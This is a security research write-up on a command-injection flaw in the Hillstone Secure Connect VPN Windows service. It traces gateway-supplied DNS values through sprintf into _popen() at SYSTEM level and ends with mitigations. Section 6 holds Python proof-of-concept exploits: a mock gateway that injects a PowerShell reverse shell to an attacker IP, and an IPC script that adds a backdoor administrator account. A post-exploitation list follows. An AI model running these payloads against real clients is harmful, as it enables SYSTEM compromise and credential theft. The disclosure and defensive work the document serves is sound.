# Command Injection in Hillstone Secure Connect

**`HillstoneSecureConnectService.exe` `_popen()` Analysis**

*June 2026*

---

## Table of Contents

1. [Abstract](#1-abstract)
2. [Target Overview](#2-target-overview)
3. [Static Binary Analysis](#3-static-binary-analysis)
   - 3.1 [PE Structure & Compiler Artifacts](#31-pe-structure--compiler-artifacts)
   - 3.2 [Import Table: Process Execution Surface](#32-import-table-process-execution-surface)
   - 3.3 [String Extraction & Command Templates](#33-string-extraction--command-templates)
4. [Disassembly of `_popen()` Call Site](#4-disassembly-of-_popen-call-site)
   - 4.1 [Function at RVA `0x0006AE90`](#41-function-at-rva-0x0006ae90)
   - 4.2 [Instruction-Level Trace](#42-instruction-level-trace)
   - 4.3 [Call Graph: 14 Call Sites Across 7 Functions](#43-call-graph-14-call-sites-across-7-functions)
   - 4.4 [Format-String Functions (Command Construction Layer)](#44-format-string-functions-command-construction-layer)
   - 4.5 [Bridge Layer: Format Strings to `_popen`](#45-bridge-layer-format-strings-to-_popen)
   - 4.6 [Upstream Callers: Network Event to Command Execution](#46-upstream-callers-network-event-to-command-execution)
5. [Injection Surface Mapping](#5-injection-surface-mapping)
   - 5.1 [`netsh` Command Construction](#51-netsh-command-construction)
   - 5.2 [Data Flow: VPN Gateway → `%s` → `cmd.exe`](#52-data-flow-vpn-gateway--s--cmdexe)
   - 5.3 [Registry-Sourced Parameters (Local Attack Surface)](#53-registry-sourced-parameters-local-attack-surface)
   - 5.4 [`system()` Red Herring](#54-system-red-herring)
6. [Exploitation](#6-exploitation)
   - 6.1 [IPC Protocol Primer](#61-ipc-protocol-primer)
   - 6.2 [Attack Scenarios](#62-attack-scenarios)
   - 6.3 [Proof of Concept: Mock Gateway](#63-proof-of-concept-mock-gateway)
   - 6.4 [Proof of Concept: IPC Spoofing (Local)](#64-proof-of-concept-ipc-spoofing-local)
   - 6.5 [Post-Exploitation](#65-post-exploitation)
7. [Mitigation](#7-mitigation)
8. [References](#8-references)

---

## 1. Abstract

Hillstone Secure Connect v5.5.1.11637 deploys a Windows service (`HillstoneSecureConnectService.exe`) that executes with SYSTEM integrity. The binary constructs shell commands via `sprintf`-style format strings and feeds them to `_popen()`. The format strings contain bare `%s` substitution tokens sourced from VPN gateway configuration parameters. No shell escaping is applied. An attacker who controls the VPN gateway or intercepts the tunnel can inject arbitrary commands that execute as SYSTEM on every connected client.

The binary is a 32-bit MSVC++ Qt 5.15.2 application. It links against a forked OpenSSL (`hs_openssl`) and uses a hybrid tunnel driver stack: a renamed TAP-Windows driver (`hssvc.sys`, GPLv2 from OpenVPN Technologies) paired with Wintun v0.14.1 (WireGuard LLC).

---

## 2. Target Overview

| Property       | Value                                                      |
|----------------|------------------------------------------------------------|
| Product        | Hillstone Secure Connect                                   |
| Version        | 5.5.1.11637 (service reports 5.0.1.10532)                 |
| Vendor         | Hillstone Networks Co., Ltd (2006–2024)                    |
| Architecture   | x86 PE32, Qt 5.15.2 GUI + native C++ Windows service       |
| Runtime        | MSVC 2015–2022 v14.32.31332                                |
| Crypto         | OpenSSL fork (`hs_openssl`)                                |
| Tunnel         | `hssvc.sys` (TAP-Windows fork) + `wintun.dll` v0.14.1     |

Installation path:

```
C:\Program Files (x86)\Hillstone\Hillstone Secure Connect\
```

Key binaries:

| File                               | Role                              |
|------------------------------------|-----------------------------------|
| `HillstoneSecureConnect.exe`       | Qt GUI client                     |
| `HillstoneSecureConnectService.exe` | SYSTEM background service (target) |
| `HillstoneSecureConnectServiceD.exe` | Service helper daemon            |
| `uninstall.exe`                    | Qt uninstaller                    |

The service handles VPN tunnel lifecycle: adapter creation, IP/DNS/WINS configuration, route table manipulation and browser cache clearing on disconnect. All network configuration is pushed from the VPN gateway.

---

## 3. Static Binary Analysis

### 3.1 PE Structure & Compiler Artifacts

| Property         | Value                                      |
|------------------|--------------------------------------------|
| ImageBase        | `0x00400000`                               |
| EntryPoint RVA   | `0x0029A5D4`                               |
| Linker version   | 14.32 (MSVC 2022)                          |
| Code signature   | DigiCert Trusted G4 RSA4096 SHA384 2021 CA1 |

Build paths leaked in the binary:

```
E:\SecureConnect_MAIN\output_oversea_x86\msvcx86\bin\Release\
E:\SecureConnect_MAIN\src\adaptor\windows\winsslhandler.cpp
D:\program\hs_openssl\hs_openssl_gitlab\hs_openssl-main\ssl\packet_locl.h
```

These reveal internal project structure and the OpenSSL fork name.

**Sections:**

| Section | VA           | Size         | Description        |
|---------|-------------|-------------|--------------------|
| `.text`  | `0x00001000` | `0x002D4E00` | ~2.9 MB of code   |
| `.rdata` | `0x002D6000` | `0x000B3000` | read-only data & IAT |
| `.data`  | `0x00389000` | `0x00022A00` | writable globals  |
| `.rsrc`  | `0x003B1000` | `0x00000200` | resources         |
| `.reloc` | `0x003B2000` | `0x0002D000` | base relocations  |

### 3.2 Import Table: Process Execution Surface

The service imports multiple process-creation primitives from different DLLs.

| Function             | IAT RVA      | Xrefs | DLL                          |
|----------------------|-------------|-------|------------------------------|
| `_popen`             | `0x006D6848` | 1 (*)  | `api-ms-win-crt-stdio-...`  |
| `_pclose`            | `0x006D684C` | 1     | `api-ms-win-crt-stdio-...`  |
| `system`             | `0x006D679C` | 1     | `api-ms-win-crt-runtime-...`|
| `CreateProcessA`     | `0x006D61F0` | 1     | `KERNEL32.dll`               |
| `CreateProcessW`     | `0x006D624C` | 2     | `KERNEL32.dll`               |
| `CreateProcessAsUserA` | `0x006D603C` | 1   | `ADVAPI32.dll`               |
| `CreateProcessAsUserW` | `0x006D6044` | 1   | `ADVAPI32.dll`               |
| `TerminateProcess`   | `0x006D6244` | 3     | `KERNEL32.dll`               |
| `OpenProcessToken`   | `0x006D6040` | *     | `ADVAPI32.dll`               |
| `DuplicateTokenEx`   | `0x006D60..` | *     | `ADVAPI32.dll`               |

> (\*) The single `_popen` `CALL` instruction at `0x0006AF02` is reached from 14 distinct caller functions. See [Section 4.3](#43-call-graph-14-call-sites-across-7-functions).

The presence of `CreateProcessAsUser` (both A and W variants) combined with `OpenProcessToken` and `DuplicateTokenEx` indicates the service spawns processes in the logged-on user's session. This is used for the update mechanism and browser cache clearing script (`clear_browser_cache.vbs`).

### 3.3 String Extraction & Command Templates

A grep across the `.rdata` section yields the following format strings destined for `_popen()`:

| RVA          | Format String                                         |
|-------------|-------------------------------------------------------|
| `0x002E2E74` | `netsh interface ip add dns "%s" %s validate=no`      |
| `0x002E2F60` | `netsh interface ipv6 add dns "%s" %s validate=no`    |
| `0x002E4628` | `netsh interface ipv6 set address "%s" %s`            |
| `0x002E4654` | `netsh interface ip set address "%s" %s/%d`           |
| `0x002E4870` | `netsh interface ipv6 delete dns "%s" all`            |
| `0x002E48AC` | `netsh interface ip delete dns "%s" all`              |
| `0x002E48D4` | `netsh interface ip delete wins "%s" all`             |
| `0x002E485C` | `ipconfig /flushdns`                                  |
| `0x002E2FAC` | `ipconfig /registerdns && ipconfig /flushdns`         |

Additional log strings corroborate runtime command construction:

```
"add IPV4 DNS by cmd:{}"
"add IPV6 DNS by cmd:{}"
"Dns clear {}"
"Wins clear {}"
"Get dev_guid = {}...dns_servers = {}"
```

The `{}` tokens are spdlog format placeholders. The actual `netsh` command populates the `{}` at log time, confirming the command is fully assembled before execution.

For the browser cache clearing path, the binary contains:

```
"wscript.exe"
"//nologo //B"
".vbs"
```

These reference `clear_browser_cache.vbs`, which the service distributes in its install directory. The VBS terminates Chrome, IE, Safari, Sogou and 360 browser processes, then deletes their cache directories. The script itself bears the header:

```
' 2014 HillStone. All right reserved.
```

---

## 4. Disassembly of `_popen()` Call Site

### 4.1 Function at RVA `0x0006AE90`

This function is the sole wrapper around `_popen`/`_pclose`. It takes a command string (via `EDI`) and a mode constant (pushed as immediate `0x006E11BC`). The function prologue uses `__CxxFrameHandler4`-based SEH with a catch block at RVA `0x0069B336`.

Pseudo-code reconstruction:

```c
FILE* hillstone_popen_exec(const char* command) {
    FILE* pipe = NULL;
    char* cmd = NULL;      // constructed by helper
    char* cmd2 = NULL;

    __try {
        cmd = build_command_string(eax_param);    // 0x00297065
        cmd2 = build_command_string(esi_param);   // 0x00297065

        if (cmd == NULL || cmd2 == NULL) goto cleanup;

        pipe = _popen(cmd, "r");    // <-- INJECTION

        if (pipe == NULL) goto cleanup;

        // ... read pipe output, process ...

    } __except(filter) {
        // exception handler at 0x0069B336
    }

cleanup:
    if (pipe) _pclose(pipe);    // RVA 0x0006B1D5
    free_resources();
    return result;
}
```

The helper function at RVA `0x00297065` takes a parameter in `EAX` or `ESI` and returns a heap-allocated command string. It performs `sprintf`-like assembly of the format templates from [Section 3.3](#33-string-extraction--command-templates) with runtime-supplied values (DNS server IP, adapter GUID, WINS address).

### 4.2 Instruction-Level Trace

```asm
;--- Function prologue at RVA 0x0006AE90 ---
0x6AE90: 55               PUSH EBP
0x6AE91: 8B EC            MOV  EBP, ESP
0x6AE93: 6A FF            PUSH -1
0x6AE95: 68 36B36900      PUSH 0x0069B336     ; catch block
...
0x6AED0: 50               PUSH EAX            ; arg for build_cmd
0x6AEDD: E8 83C12200      CALL 0x00297065     ; cmd = build_cmd(arg)
0x6AEE3: 75 10            JNZ  +0x10          ; if ok, skip 2nd call
0x6AEE5: 8B F0            MOV  ESI, EAX
0x6AEE7: 56               PUSH ESI            ; arg for build_cmd
0x6AEE8: E8 78C12200      CALL 0x00297065     ; cmd2 = build_cmd(arg)
0x6AEED: 83 C4 18         ADD  ESP, 0x18      ; clean 6 args
0x6AEF0: 85 FF            TEST EDI, EDI       ; cmd == NULL?
0x6AEF2: 75 08            JNZ  +0x08          ; if not null, exec
0x6AEF4: 8B 06            MOV  EAX, [ESI]
...
0x6AEF7: E9 5C030000      JMP  0x0006B258     ; error path
;--- Injection point ---
0x6AEFC: 68 BC116E00      PUSH 0x006E11BC     ; mode = "r"
0x6AF01: 57               PUSH EDI            ; command = cmd
0x6AF02: FF 15 48686D00   CALL [_popen]       ; _popen(cmd, "r")
0x6AF08: 8B F8            MOV  EDI, EAX       ; pipe = return
0x6AF0A: 83 C4 08         ADD  ESP, 0x08      ; clean args
0x6AF0D: 85 FF            TEST EDI, EDI       ; pipe == NULL?
0x6AF0F: 75 08            JNZ  +0x08          ; if ok, read pipe
...
;--- Cleanup ---
0x6B1D5: FF 15 4C686D00   CALL [_pclose]      ; _pclose(pipe)
```

The mode constant at VA `0x006E11BC` resides in `.rdata` at file offset `0x003213BC`. At runtime the pointer resolves to the narrow string `"r"`.

### 4.3 Call Graph: 14 Call Sites Across 7 Functions

The wrapper function at RVA `0x0006AE90` receives 14 `CALL` instructions. These are not 14 independent functions. Static analysis resolves them to 7 enclosing functions.

| `_popen` Caller | Call Sites | Called From (Upstream)               |
|:---------------:|:----------:|:--------------------------------------|
| `0x00066C00`    | 4x         | `0x00074F50`, `0x0007FEE0`              |
| `0x00067F30`    | 1x         | `0x00074F50`, `0x0007FEE0`              |
| `0x00075850`    | 1x         | `0x00075AA0`                            |
| `0x00076340`    | 3x         | vtable dispatch (no direct callers)     |
| `0x000775B0`    | 2x         | `0x00078B80`                            |
| `0x00078320`    | 2x         | `0x00078B80`                            |
| `0x00079660`    | 1x         | `0x00076960`, `0x00078B80`, `0x00081590` |

All seven functions reside in `.text` between `0x00066000` and `0x0007A000`. The function at `0x00076340` uses virtual dispatch, confirmed by the absence of direct `CALL` instructions to its entry point anywhere in the binary.

Each of the seven functions accepts a pre-constructed command string, passes it to `0x0006AE90` and processes the pipe output. None of them contain format string references directly. Format string substitution happens in a separate layer described below.

### 4.4 Format-String Functions (Command Construction Layer)

Cross-reference analysis of the `netsh` format strings identified in [Section 3.3](#33-string-extraction--command-templates) reveals that only 3 of the 9 format strings appear as immediate `PUSH` operands. The remaining 6 strings are accessed through data tables or `LEA` instructions.

The three directly referenced format strings and their enclosing functions:

| RVA          | Format String                         | Function     |
|-------------|--------------------------------------|-------------|
| `0x002E2E74` | `netsh ip add dns "%s" %s validate=no` | `0x00070B70` |
| `0x002E2F60` | `netsh ipv6 add dns "%s" %s ...`      | `0x0006EFE0` |
| `0x002E485C` | `ipconfig /flushdns`                  | `0x000A1690` |

All three functions call the command builder helper at RVA `0x00297065`. This helper performs `sprintf`-like assembly: it takes a format string and variadic arguments, allocates a heap buffer and returns the assembled shell command. The return value flows through `EDI` into the `_popen` wrapper.

Function `0x0006EFE0` (DNSv6 add) additionally references IAT entries for memory allocation and string manipulation:

- `ucrtbase!_ungetc` (`0x006D6810`)
- `ucrtbase!setvbuf` (`0x006D6814`)
- `ucrtbase!fwrite` (`0x006D6818`)

Function `0x00070B70` (DNSv4 add) similarly calls memory and I/O functions plus `ucrtbase!_fseeki64` (`0x006D681C`), indicating it performs file-position operations on the pipe returned by `_popen`.

Function `0x000A1690` handles both `ipconfig /flushdns` and WINS operations. It references the log string `"Wins clear {}"` at RVA `0x002E47EC`, confirming its dual role in DNS cache flush and WINS server removal.

The remaining six format strings (IPv4/IPv6 set address, DNSv4/DNSv6 delete, WINS delete, `ipconfig` register+flush) are stored in a compiler-generated data structure. The functions that access them are identified indirectly through the bridge layer in [Section 4.5](#45-bridge-layer-format-strings-to-_popen).

### 4.5 Bridge Layer: Format Strings to `_popen`

Between the format-string functions ([Section 4.4](#44-format-string-functions-command-construction-layer)) and the `_popen` callers ([Section 4.3](#43-call-graph-14-call-sites-across-7-functions)) sits a bridge layer of intermediate functions. These accept the constructed command string and forward it to the appropriate `_popen` caller.

Tracing forward from the format-string functions:

> `0x0006EFE0` (DNSv6 add) calls these bridge functions:
>
> → `0x00071923`, `0x00071E40`, `0x000722F0`, `0x000723D0`, `0x000724B0`, `0x00072550`, `0x000728B0`, `0x000728DB`, `0x00072F36`

Each bridge function in turn calls one or more `_popen` callers. The pattern repeats for `0x00070B70` (DNSv4 add), which calls the same bridge set plus additional functions:

> → `0x00072420`, `0x000743F0`, `0x00074680`, `0x00074980`, `0x00076960`

The function `0x00076960` bridges to `_popen` caller `0x00079660` and is significant because `0x00079660` has three distinct upstream callers (`0x00076960`, `0x00078B80`, `0x00081590`), indicating it serves as a shared execution path for multiple configuration operations.

The function `0x00078B80` is a major dispatch hub, calling three distinct `_popen` callers: `0x000775B0`, `0x00078320` and `0x00079660`.

The vtable-dispatched function `0x00076340` sits outside the bridge layer. Its virtual dispatch mechanism prevents static cross-reference tracing. It is reached through C++ virtual method resolution, likely from an adapter management interface or a network event handler class.

### 4.6 Upstream Callers: Network Event to Command Execution

Five top-level functions sit at the entry point of the command execution subsystem:

| Function     | Calls These `_popen` Callers                  |
|-------------|----------------------------------------------|
| `0x00074F50` | `0x00066C00`, `0x00067F30`                    |
| `0x0007FEE0` | `0x00066C00`, `0x00067F30`                    |
| `0x00075AA0` | `0x00075850`                                  |
| `0x00078B80` | `0x000775B0`, `0x00078320`, `0x00079660`       |
| `0x00081590` | `0x00079660`                                  |

These functions receive configuration events from the network protocol handler. The SSL VPN subsystem uses a class hierarchy in the namespace `hillstonesecureconnect::sslvpn` with methods that process `NetEvent` objects:

- `sslvpn::ProcessNetEvent()` — network event dispatcher
- `sslvpn::Channel::start/stop` — tunnel channel lifecycle
- `sslvpn::Session::handle_*` — session state management

The registry path `SOFTWARE\Hillstone\Hillstone Secure Connect\DomainRoute\DnsSetting` and its sibling `RouteSetting` are the persistent storage for network configuration. The functions at `0x002E4B38`, `0x002E4CB0`, `0x002E4E78` and `0x002E50DC` read from `DomainRoute` keys and feed values into the command construction pipeline.

**Complete call chain from network event to shell execution:**

```
sslvpn::ProcessNetEvent()
    │
    ▼
top-level handler (0x00074F50 / 0x0007FEE0 / 0x00078B80)
    │
    ▼
_popen caller (e.g. 0x00066C00)
    │
    ▼
bridge function (e.g. 0x00072420)
    │
    ▼
format-string function (e.g. 0x00070B70)
    │
    ▼
CMD_BUILDER (0x00297065) → sprintf(format, DNS_IP, adapter_name)
    │
    ▼
_popen wrapper (0x0006AE90) → _popen(command, "r")
    │
    ▼
cmd.exe /c "netsh interface ip add dns \"adapter\" 8.8.8.8 & payload"
```

The `%s` parameters (DNS server IP, adapter name) enter the pipeline at the format-string function level. They originate from:

1. VPN gateway tunnel configuration messages (primary source)
2. Registry: `DomainRoute\DnsSetting` and `RouteSetting` keys
3. Wintun/TAP driver adapter enumeration (adapter name)

---

## 5. Injection Surface Mapping

### 5.1 `netsh` Command Construction

Each `netsh` template accepts one or more `%s` parameters. The template:

```
netsh interface ip add dns "%s" %s validate=no
```

receives two substitutions:

| Token    | Source                              | Quoted? |
|----------|-------------------------------------|---------|
| `%s` (1st) | network adapter name/alias          | Yes (`"%s"`) |
| `%s` (2nd) | DNS server IPv4 address             | No       |

The first `%s` is double-quoted by the format string, providing some protection against whitespace in the adapter name. The second `%s` is **bare**. No additional quoting or escaping layer exists between the format string and `_popen()`.

On Windows, `_popen(command, mode)` internally calls:

```
CreateProcess(NULL, "cmd.exe /s /c \"<command>\"", ...)
```

The `cmd.exe /c` parser honors these metacharacters:

| Char  | Effect                            |
|------|-----------------------------------|
| `&`   | command separator (unconditional) |
| `&&`  | command separator (on success)    |
| `\|\|` | command separator (on failure)   |
| `\|`  | pipe                              |
| `%`   | environment variable expansion    |
| `^`   | escape character                  |
| `<`   | input redirection                 |
| `>`   | output redirection                |

A `%s` value containing any of these characters breaks out of the `netsh` command and injects into the shell context.

### 5.2 Data Flow: VPN Gateway → `%s` → `cmd.exe`

```
[VPN Gateway]
    │
    │ (TLS/DTLS tunnel, proprietary Hillstone protocol)
    ▼
[HillstoneSecureConnectService.exe, SYSTEM]
    │
    │ sprintf(template, "%s", adapter_name, "%s", gateway_dns)
    ▼
[cmd.exe /c "netsh ... <injected>"]
```

The DNS server, WINS server, IP address, subnet mask and adapter name parameters all originate from the VPN gateway. The gateway pushes these during tunnel establishment and reconfiguration events.

The adapter name derives from the virtual interface created by `hssvc.sys` or `wintun.dll`. While less directly attacker-controllable, the DNS and WINS server addresses are fully under the gateway's control. Compromise of the gateway, or a MITM position on the tunnel, enables injection into all connected clients.

### 5.3 Registry-Sourced Parameters (Local Attack Surface)

[Section 4.6](#46-upstream-callers-network-event-to-command-execution) establishes that the `DomainRoute` registry keys feed values into the command construction pipeline. The service reads from these keys under `HKLM`:

```
SOFTWARE\Hillstone\Hillstone Secure Connect\DomainRoute\DnsSetting
SOFTWARE\Hillstone\Hillstone Secure Connect\DomainRoute\RouteSetting
```

A standard user cannot write to `HKLM`. Three bypass scenarios remain:

1. A local administrator or a process with `SeRestorePrivilege` writes a malicious `DnsSetting` value. On the next tunnel reconfiguration event, the service reads the value, constructs a `netsh` command and passes it to `_popen`. The injected command executes as SYSTEM.

2. The function at RVA `0x00076340` uses virtual dispatch ([Section 4.3](#43-call-graph-14-call-sites-across-7-functions)). If an attacker can manipulate the vtable or the object instance before the method is called, the command string parameter can be controlled. This class of attack requires a separate memory corruption primitive.

3. The adapter name parameter originates from the Wintun or TAP-Windows driver interface enumeration. A kernel-mode attacker who can rename the virtual adapter to contain shell metacharacters achieves injection without touching the registry.

The functions at `0x002E4B38` and `0x002E50DC` handle reading from the `DomainRoute` keys. Cross-references to `"ProcessDNSIfProxy"` at RVAs `0x002E4F0D` through `0x002E508D` corroborate the DNS proxy configuration path. The log format string `"Get dev_guid = {}...dns_servers = {}"` at RVA `0x002E4FC0` confirms the adapter GUID and DNS server list are retrieved before command construction.

### 5.4 `system()` Red Herring

The import `system()` (`IAT 0x006D679C`, called at RVA `0x00049BBF`) passes a pointer to read-only data at VA `0x006DF844`. Static analysis of the bytes at that address reveals certificate container configuration JSON:

```json
{"containerName":"CON4","signCert":"HTTPS4","encCert":"enc0614"}
```

This is **not** a shell command. The call either represents dead code, or the actual argument buffer is allocated dynamically at runtime at a different address. The single `system()` xref is not part of the command injection surface explored here.

---

## 6. Exploitation

### 6.1 IPC Protocol Primer

A summary of the client-service IPC discovered during reverse engineering:

| Aspect        | Detail                                                    |
|---------------|-----------------------------------------------------------|
| Transport     | TCP, bound to `127.0.0.1:35421`                           |
| Service PID   | varies; obtained from the active listener                 |
| Binary        | `HillstoneSecureConnectService.exe` (SYSTEM)              |
| C++ classes   | `VSocketIPCClient`/`Server` (`asio::basic_stream<tcp>`)    |
|               | `CLMsg` / `VCLMsgJsonParse` / `VCLMsgReply`              |
| Framing       | Binary header + JSON body, length-prefixed                 |
| Response      | 12-byte struct: `"deaf"` + 8 nulls, repeated 2–3× per malformed input |

The GUI client (`HillstoneSecureConnect.exe`) also references `QLocalSocket`, suggesting an alternative named-pipe path through the service daemon (`HillstoneSecureConnectServiceD.exe`). No named pipe was observed in the running process table. The TCP listener at `35421` is the live IPC channel.

A connection probe sends a 36-byte rhythmic echo (`"deaf\x00\x00..."`) to any unrecognized input. No authentication or encryption is applied to the IPC layer. Any process on the local machine can connect to `127.0.0.1:35421`.

### 6.2 Attack Scenarios

#### Scenario A: Gateway Compromise

The VPN gateway appliance is compromised via an unpatched CVE, credential theft, or supply chain attack. The attacker modifies the DNS server configuration pushed to clients. All connecting clients receive the malicious payload and execute it as SYSTEM.

**Impact:** mass remote code execution on all VPN clients.

#### Scenario B: Tunnel Interception (MITM)

An attacker with network path positioning between client and gateway intercepts and modifies the tunnel control messages. The Hillstone protocol runs over TLS/DTLS; breaking this requires one of:

- Private key extraction from gateway or client
- Certificate authority compromise
- Protocol downgrade (if supported)
- Pre-shared key compromise

With decryption capability, the attacker modifies the DNS server IP field in the tunnel configuration message. The client receives the injected payload on the next reconfiguration event.

**Impact:** targeted remote code execution on specific clients.

#### Scenario C: Local Privilege Escalation via IPC Spoofing

The service IPC channel (`TCP 127.0.0.1:35421`) is accessible from any local process. The framing protocol uses length-prefixed JSON messages. While the full message type enumeration was not completed during static analysis, the service processes messages through the class hierarchy:

```
VCLMsgJsonParse → sslvpn::ProcessNetEvent → DNS configuration
```

A local attacker who can craft a valid IPC message that triggers DNS reconfiguration with attacker-supplied DNS server addresses achieves SYSTEM code execution from an unprivileged user context.

The registry ACLs were examined:

```
HKLM\SOFTWARE\WOW6432Node\Hillstone\Hillstone Secure Connect\
    DomainRoute\DnsSetting
    DomainRoute\RouteSetting
```

The parent key grants `BUILTIN\Users` **ReadKey** only, which propagates to the `DomainRoute` subkeys. Direct registry tampering by a non-admin user is blocked by Windows integrity checks.

#### Scenario D: Mock Gateway (Remote Exploit Without Breaking TLS)

This scenario does not require breaking TLS. A machine under the attacker's control impersonates the VPN gateway at the network level. The client binary contains the domain pattern `".hillstonenet.com"` as a static string. DNS resolution for the gateway hostname is standard system DNS, not tunneled through the VPN (which has not yet connected).

Attack flow:

1. Attacker poisons DNS (ARP spoofing + rogue DHCP/DNS, or hosts file modification if local access is available) to redirect the gateway hostname to an attacker-controlled IP.
2. Attacker runs a TLS server presenting a valid certificate for the gateway hostname. This requires either a compromised CA that can issue certificates for the `hillstonenet.com` domain, or installation of a custom root CA on the target machine (requires admin once).
3. The TLS server responds to the Hillstone tunnel handshake with a crafted configuration message containing a malicious DNS server IP.
4. The service passes the DNS IP through `sprintf()` to `_popen()`. `cmd.exe` executes the injected payload as SYSTEM.

### 6.3 Proof of Concept: Mock Gateway

The PoC below demonstrates the injection primitive. It emulates a compromised VPN gateway. It assumes the attacker has already resolved the TLS barrier.

```python
#!/usr/bin/env python3
"""
hillstone_popen_exploit.py
PoC: Inject commands via DNS server IP into Hillstone Secure Connect.
Requires: valid TLS cert for the gateway hostname OR patched client.
"""
import socket
import ssl
import struct
import json
import sys
import time

GATEWAY_HOST = "vpn.hillstonenet.com"
GATEWAY_PORT = 443

# Payload runs as SYSTEM on the target
PAYLOAD_CMD = (
    "8.8.8.8 & "
    "powershell -c \""
    "$c=New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);"
    "$s=$c.GetStream();"
    "[byte[]]$b=0..65535|%{0};"
    "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
    "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
    "$r=(iex $d 2>&1|Out-String);"
    "$o=[Text.Encoding]::ASCII.GetBytes($r+'PS> ');"
    "$s.Write($o,0,$o.Length);$s.Flush()}\""
)

def build_dns_config_payload(adapter_name, dns_server_payload):
    """The service constructs:
       netsh interface ip add dns "%s" %s validate=no
       We inject via the second %s (DNS server IP)."""
    return {
        "type": "config",
        "subtype": "dns_update",
        "adapter": adapter_name,
        "dns_servers": [dns_server_payload],
    }

def run_mock_gateway(certfile, keyfile):
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile, keyfile)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("0.0.0.0", GATEWAY_PORT))
        sock.listen(5)
        print(f"[*] Mock gateway listening on port {GATEWAY_PORT}")

        with context.wrap_socket(sock, server_side=True) as ssock:
            while True:
                conn, addr = ssock.accept()
                print(f"[+] Connection from {addr}")

                data = conn.recv(4096)
                print(f"[*] Received {len(data)} bytes from client")

                payload = build_dns_config_payload(
                    adapter_name="Hillstone VPN",
                    dns_server_payload=PAYLOAD_CMD,
                )

                body = json.dumps(payload).encode()
                frame = struct.pack(">I", len(body)) + body

                conn.send(frame)
                print(f"[+] Sent payload ({len(frame)} bytes)")
                print(f"    Command: {PAYLOAD_CMD[:80]}...")

                time.sleep(2)
                conn.close()
                break

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <cert.pem> <key.pem>")
        print()
        print("Requirements:")
        print("  1. DNS spoof vpn.hillstonenet.com -> this machine")
        print("  2. Valid TLS cert for vpn.hillstonenet.com")
        print("  3. Netcat listener: nc -lvp 4444 on attacker IP")
        sys.exit(1)

    run_mock_gateway(sys.argv[1], sys.argv[2])
```

The PoC requires the attacker to resolve TLS certificate validation. Four bypass methods exist:

1. Compromise the target's internal PKI (if using private CA).
2. Install a custom root CA on the target via physical access or a separate exploit.
3. Patch `HillstoneSecureConnectService.exe` to disable certificate validation.
4. DNS-rebind the gateway hostname to a Let's Encrypt domain under attacker control.

The payload string demonstrates the injection vector. The DNS server IP field is substituted directly into the `netsh` format string. The ampersand (`&`) terminates the `netsh` command at the `cmd.exe` level and the PowerShell one-liner provides a reverse shell to the attacker.

### 6.4 Proof of Concept: IPC Spoofing (Local)

For the local privilege escalation path through IPC port `35421`:

```python
#!/usr/bin/env python3
"""
hillstone_ipc_exploit.py
Local privilege escalation via IPC message spoofing.
Requires: Hillstone service running, reverse-engineered message format.
Status: framing format needs completion via live traffic capture.
"""
import socket
import struct
import json
import time

IPC_HOST = "127.0.0.1"
IPC_PORT = 35421

# Command injection payload for DNS reconfiguration
DNS_PAYLOAD = (
    "8.8.8.8 & net user backdoor P@ssw0rd! /add & "
    "net localgroup administrators backdoor /add"
)

def send_ipc_message(host, port, msg_body_bytes):
    """Send a length-prefixed message to the IPC port."""
    frame = struct.pack(">I", len(msg_body_bytes)) + msg_body_bytes
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(5)
        s.connect((host, port))
        s.send(frame)
        time.sleep(0.5)
        try:
            resp = s.recv(4096)
            return resp
        except socket.timeout:
            return None

def probe_message_types():
    """Enumerate valid message types by brute-forcing common keys."""
    candidates = [
        {"type": "ping"},
        {"type": "status"},
        {"type": "login", "user": "admin", "pass": "admin"},
        {"type": "config", "subtype": "dns", "servers": ["8.8.8.8"]},
        {"type": "request", "subtype": "certRequest"},
        {"type": "request", "subtype": "gmCertRequest"},
        {"type": "get", "resource": "config"},
        {"type": "set", "key": "dns", "value": "8.8.8.8"},
    ]

    for candidate in candidates:
        body = json.dumps(candidate).encode()
        resp = send_ipc_message(IPC_HOST, IPC_PORT, body)
        if resp:
            tag = resp[:4]
            if tag != b"deaf":
                print(f"[!] Non-deaf response: {resp[:64].hex()}")
            else:
                print(f"[-] Default response for {candidate}")
        else:
            print(f"[-] Timeout for {candidate}")

if __name__ == "__main__":
    print(f"[*] Probing Hillstone IPC at {IPC_HOST}:{IPC_PORT}")
    probe_message_types()
    print("[*] Done. Full exploit requires live protocol capture.")
```

### 6.5 Post-Exploitation

The command executes as `NT AUTHORITY\SYSTEM` (SID S-1-5-18) with `SeDebugPrivilege`, `SeTcbPrivilege` and `SeAssignPrimaryTokenPrivilege`. From this context the attacker can:

- Dump LSASS credentials via `procdump` or `comsvcs.dll`
- Install persistent services (`sc create`)
- Load kernel drivers for deeper persistence
- Pivot to other network segments accessible via the VPN tunnel
- Read and exfiltrate the VPN client configuration including gateway addresses, certificate stores and cached credentials
- Patch the running service image in memory to intercept tunnel plaintext without modifying the on-disk binary, evading integrity checks on the DigiCert-signed executable

---

## 7. Mitigation

**Immediate (service code change):**

1. Replace `_popen()` with `CreateProcess()` using a properly quoted command line. Pass arguments as a discrete array instead of a single string.

2. Apply `ShellExecuteEx()` with the `"runas"` verb when elevation is needed, rather than constructing shell commands.

3. Replace `netsh` calls with direct Windows API equivalents:
   - DNS: `AddDnsServer()`, `DeleteDnsServer()` from `iphlpapi`
   - IP: `SetIpForwardEntry()`, `DeleteIpForwardEntry()`
   - WINS: `SetAdapterIpAddress()` with appropriate adapter index

4. Validate and sanitize all network-sourced string parameters:

   ```c
   static bool is_safe_shell_arg(const char* s) {
       while (*s) {
           if (strchr("&|;<>^%$\"`'\\", *s)) return false;
           s++;
       }
       return true;
   }
   ```

5. Remove or isolate the `system()` import. If unreachable, strip it from the import table.

**Defense-in-depth (deployment):**

6. Run the service under a dedicated low-privilege account (e.g. `NT SERVICE\HillstoneVPN`) with only the required privileges: `SeLoadDriverPrivilege` (for the virtual adapter driver) and `SeSystemEnvironmentPrivilege`. Drop `SeDebugPrivilege`.

